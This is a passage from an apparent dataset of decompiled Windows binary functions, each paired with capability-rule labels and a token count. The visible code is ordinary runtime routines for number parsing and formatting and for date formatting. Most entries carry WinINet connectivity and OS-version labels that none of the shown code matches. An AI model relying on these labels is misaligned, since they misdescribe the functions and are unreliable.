puVar8 = puVar7 + 1;\n                    uVar1 = *puVar7;\n                    puVar7 = puVar8;\n                    if ((uVar1 != 0x23) && (uVar1 != 0x30)) break;\n                    fcn.0040a00f();\n                }\n            } while ((uVar1 == 0x2e) || (uVar1 == 0x2c));\n            if ((uVar1 != 0x27) && (uVar1 != 0x22)) break;\n            while( true ) {\n                uVar2 = *puVar8;\n                puVar7 = puVar8 + 1;\n                if (uVar2 == uVar1) break;\n                if (uVar2 == 0) goto code_r0x0040a009;\n                *puVar9 = uVar2;\n                puVar8 = puVar8 + 1;\n                puVar9 = puVar9 + 1;\n            }\n        }\n        if ((uVar1 == 0x45) || (uVar1 == 0x65)) {\n            uVar4 = CONCAT11(*puVar8, uVar1);\n            cVar5 = uVar4 >> 8;\n            if ((cVar5 == '+') || (cVar5 == '-')) break;\n        }\n        else if ((uVar1 == 0x3b) || (uVar4 = uVar1,  uVar1 == 0)) {\ncode_r0x0040a009:\n            return puVar9 - *(unaff_EBP + -4);\n        }\n        *puVar9 = uVar4;\n        puVar9 = puVar9 + 1;\n    } while( true );\n    do {\n        puVar8 = puVar8 + 1;\n    } while (*puVar8 == 0x30);\n    fcn.00409a74(iVar3);\n    puVar7 = puVar8;\n    goto code_r0x00409f91;\n}\n",
        "token_count": 878
    },
    "0040a00f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040a017: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040a01c)\n// WARNING: Removing unreachable block (ram,0x0040a021)\n\nvoid fcn.0040a00f(void)\n\n{\n    char cVar1;\n    char *unaff_EBX;\n    int32_t unaff_EBP;\n    ushort *unaff_EDI;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_35h;\n    uint var_ah;\n    \n    if ((*(unaff_EBP + -0x48) == 0) || (-1 < *(unaff_EBP + -0x48))) {\n        cVar1 = *unaff_EBX;\n        if (cVar1 == '\\0') {\n            if (*(unaff_EBP + -0x44) <= *(unaff_EBP + -0x3c)) goto code_r0x0040a071;\n            goto code_r0x0040a040;\n        }\n    }\n    else {\n        *(unaff_EBP + -0x48) = *(unaff_EBP + -0x48) + 1;\n        if (*(unaff_EBP + -0x40) < *(unaff_EBP + -0x44)) goto code_r0x0040a071;\ncode_r0x0040a040:\n        cVar1 = '0';\n    }\n    if (*(unaff_EBP + -0x44) == 0) {\n        *unaff_EDI = CONCAT11(cVar1, *(unaff_EBP + -9));\n    }\n    else {\n        *unaff_EDI = cVar1;\n        if ((((*(unaff_EBP + -0x35) != '\\0') && (1 < *(unaff_EBP + -0x44))) && (*(unaff_EBP + -0x44) % 3 == '\\x01')) &&\n           (*(unaff_EBP + -10) != '\\0')) {\n            *(unaff_EDI + 1) = *(unaff_EBP + -10);\n        }\n    }\ncode_r0x0040a071:\n    *(unaff_EBP + -0x44) = *(unaff_EBP + -0x44) + -1;\n    return;\n}\n",
        "token_count": 521
    },
    "0040a080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a080(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.0040a0ad(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.0040a1cf(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0040a0ad": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0ad(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x0040a0d8:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00403368();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x48316c);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x483178);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040a0d8;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040a19a;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040a19a:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040a1ad;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040a1ad:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040a1b0;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040a0d8;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040a1b0:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1193
    },
    "0040a2ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a2ac(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x48568b;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040a363();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040a36e();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040a36e();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040a38a(iVar4);\n        }\n        fcn.0040a363();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00403368();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 535
    },
    "0040a650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040a650(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX < 0) || (in_EAX[1] < 1)) {\n        fcn.004087f8(in_EAX[1], 0, *in_EAX, 0);\n    }\n    return;\n}\n",
        "token_count": 76
    },
    "0040a84c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040a84c(double *arg_8h)\n\n{\n    uint16_t *puVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    double *pdVar4;\n    uint16_t in_CX;\n    int32_t iVar5;\n    uint16_t in_DX;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uVar2 = fcn.0040a810();\n    iVar6 = (uVar2 & 0x7f) * 0x18;\n    pdVar4 = iVar6 + 0x4830e0;\n    if ((((in_AX != 0) && (in_AX < 10000)) && (in_DX != 0)) &&\n       (((in_DX < 0xd && (in_CX != 0)) &&\n        (puVar1 = iVar6 + 0x4830de + in_DX * 2,  pdVar4 = in_DX,  in_CX < *puVar1 || in_CX == *puVar1)))) {\n        iVar3 = in_DX - 1;\n        if (0 < iVar3) {\n            iVar5 = 1;\n            do {\n                in_CX = in_CX + *(iVar6 + 0x4830de + iVar5 * 2);\n                iVar5 = iVar5 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = in_AX - 1;\n        iVar6 = iVar3;\n        if (iVar3 < 0) {\n            iVar6 = in_AX + 2;\n        }\n        *arg_8h = ((iVar3 * 0x16d + (iVar6 >> 2)) - iVar3 / 100) + iVar3 / 400 + in_CX + -0xa955a;\n        var_1h._0_1_ = 1;\n        pdVar4 = arg_8h;\n    }\n    return pdVar4 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 511
    },
    "0040abd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040abd8(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040aa9c(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0040ac10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac10(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040a7b4(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0040ac50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ac50(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_18h;\n    uint var_12h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_11ch = 0;\n    var_4h = 0;\n    uStack304 = 0x40ada1;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.004045c8();\n    var_18h._0_2_ = *(arg_8h + -0xe);\n    var_18h._2_2_ = *(arg_8h + -0x10);\n    var_12h._0_2_ = *(arg_8h + -0x12);\n    fcn.00404660();\n    uVar1 = fcn.00404a88(&fcn.0040ac50::var_118h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040ac50::var_18h, uVar1);\n    uStackY336 = 0x40acd3;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40aced;\n        fcn.00404838();\n        if (in_EAX == 1) {\n            if (*0x485748 == 4) {\n                if (*0x48574c == 1) {\n                    fcn.00404888();\n                    uStackY336 = 0x40ad39;\n                    iVar2 = fcn.0040d31c();\n                    if (iVar2 == 4) {\n                        iVar2 = fcn.0040d430();\n                        var_8h = &fcn.0040ac50::var_11ch + iVar2 + 3;\n                        fcn.004047c0();\n                        fcn.0040d494();\n                        uStackY336 = 0x40ad80;\n                        fcn.004046b8();\n                    }\n                }\n            }\n            else if (*0x485748 == 0x11) {\n                fcn.0040d494();\n                fcn.00404ae8();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.004045c8(0x40ada8);\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 654
    },
    "0040aec4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040aec4(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint *in_FS_OFFSET;\n    uint uVar6;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    uint8_t *var_24h;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40b66a;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x483110) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040d514();\n                uVar5 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar5 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar5 + 0xbf < 0x1a) && (uVar3 = uVar5,  uVar5 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar5 = 0x4e;\n                    uVar3 = uVar5;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (16 cases) at 0x40afe4\n                switch(uVar5) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x483110) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040d514();\n                        }\n                    }\n                    fcn.0040aaf8(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040aaf8(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x48568d != '\\0') {\n                        fcn.0040aaf8(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x485698 != '\\0') {\n                        fcn.0040aaf8(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040ac10(&stack0xfffffffc);\n                    iVar4 = fcn.004093dc();\n                    if (iVar4 == 0) {\n                        fcn.0040aaf8(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar4 = fcn.004093dc();\n                        if (iVar4 == 0) {\n                            fcn.0040aaf8(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar4 = fcn.004093dc();\n                            if (iVar4 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040ab3c(arg_8h);\n                                }\n                                else {\n                                    fcn.0040ab3c(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar4 = fcn.004093dc();\n                                if (iVar4 == 0) {\n                                    fcn.0040abd8(&stack0xfffffffc);\n                                    uVar6 = *(arg_8h + 8);\n                                    fcn.0040aabc(uVar6, *(arg_8h + 0xc));\n                                    fcn.0040ab3c(uVar6);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar4 = fcn.004093dc();\n                                    if (iVar4 == 0) {\n                                        fcn.0040abd8(&stack0xfffffffc);\n                                        uVar6 = *(arg_8h + 8);\n                                        fcn.0040aabc(uVar6, *(arg_8h + 0xc));\n                                        fcn.0040ab3c(uVar6);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040aaf8(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040aec4(arg_8h);\n                    fcn.0040ac10(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040aaf8(arg_8h);\n                        fcn.0040aec4(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040abd8(&stack0xfffffffc);\n                        fcn.0040ab5c(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar6 = *(arg_8h + 8);\n                        fcn.0040aabc(uVar6, *(arg_8h + 0xc));\n                        fcn.0040ab3c(uVar6);\n                    }\n                    else if (var_ch == 4) {\n                        uVar6 = *(arg_8h + 8);\n                        fcn.0040aabc(uVar6, *(arg_8h + 0xc));\n                        fcn.0040ab3c(uVar6);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040aec4(arg_8h);\n                    }\n                    else {\n                        fcn.0040aec4(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040abd8(&stack0xfffffffc);\n                    iVar4 = arg_8h;\n                    fcn.0040adbc(&stack0xfffffffc);\n                    fcn.0040ab3c(iVar4);\n                    break;\n                case 0x47:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040abd8(&stack0xfffffffc);\n                    iVar4 = arg_8h;\n                    fcn.0040ac50(&stack0xfffffffc);\n                    fcn.0040ab3c(iVar4);\n                    break;\n                case 0x48:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040ac10(&stack0xfffffffc);\n                    bVar2 = false;\n                    var_24h = var_4h;\n                    while (*var_24h != 0) {\n                        if ((*((*var_24h >> 3) + 0x483110) >> (*var_24h & 7) & 1) == 0) {\n                            uVar1 = *var_24h;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040b24c;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040b24c:\n                                if (!bVar2) {\n                                    iVar4 = fcn.004093dc();\n                                    if ((iVar4 != 0) && (iVar4 = fcn.004093dc(),  iVar4 != 0)) {\n                                        fcn.004093dc();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            var_24h = var_24h + 1;\n                        }\n                        else {\n                            var_24h = fcn.0040d514();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040ab5c(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040abd8(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040ab5c(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040ab3c(arg_8h);\n                    }\n                    else {\n                        fcn.0040ab3c(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040ac10(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040ab5c(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040ac10(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040ab5c(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040aec4(arg_8h);\n                    }\n                    else {\n                        fcn.0040aec4(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040abd8(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040ab5c(arg_8h);\n                    }\n                    else {\n                        fcn.0040ab5c(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040aba8(&stack0xfffffffc);\n                    fcn.0040ac10(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040ab5c(arg_8h);\n                }\n            }\n            else {\n                iVar4 = arg_8h;\n                fcn.0040d4f4();\n                fcn.0040aaf8(iVar4);\n                var_4h = fcn.0040d514();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40b671;\n    uStack68 = 0x40b669;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 2767
    },
    "0040b91c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040b91c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x485754;\n    puVar4 = 0x485770;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.00404a88();\n        fcn.00404a88(uVar1);\n        iVar2 = fcn.0040d668();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 227
    },
    "0040b970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040b970(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x485748 == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040aae4();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 242
    },
    "0040b9cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b9cc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_14h;\n    uint var_12h;\n    ushort var_eh;\n    ushort var_ch;\n    char var_ah;\n    uchar var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack64 = 0x40bce7;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_12h._0_2_ = 0;\n    var_14h = 0;\n    var_18h._0_1_ = 0;\n    var_9h = 0;\n    var_ah = fcn.0040b888();\n    var_4h = 0;\n    if ((*0x485690 == NULL) || (**0x485690 != 'g')) {\n        iVar2 = fcn.0040d5a0();\n        if (0 < iVar2) {\n            var_4h = *0x485770;\n        }\n    }\n    else {\n        fcn.0040b8d4();\n        fcn.00404ae8(&fcn.0040b9cc::var_20h);\n        fcn.00408b28();\n        var_4h = fcn.0040b91c();\n    }\n    cVar1 = fcn.0040b730(&fcn.0040b9cc::var_18h + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040b850(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40bac2;\n        cVar1 = fcn.0040b730(&fcn.0040b9cc::var_18h + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040b850();\n            if (cVar1 == '\\0') {\n                fcn.0040aae4();\n                if (var_ah == '\\x01') {\n                    var_14h = var_ch;\n                    var_12h._0_2_ = var_eh;\n                }\n                else {\n                    var_12h._0_2_ = var_ch;\n                    var_14h = var_eh;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040b9cc::var_18h + 1;\n                cVar1 = fcn.0040b730(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040bccc;\n                if (var_ah == '\\0') {\n                    var_18h._0_1_ = var_18h._1_1_;\n                    var_12h._0_2_ = var_ch;\n                    var_14h = var_eh;\n                }\n                else if (var_ah == '\\x01') {\n                    var_18h._0_1_ = var_18h._1_1_;\n                    var_12h._0_2_ = var_eh;\n                    var_14h = var_ch;\n                }\n                else if (var_ah == '\\x02') {\n                    var_18h._0_1_ = var_18h._3_1_;\n                    var_12h._0_2_ = var_eh;\n                    var_14h = var_12h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_18h < 3) {\n                        fcn.0040aae4();\n                    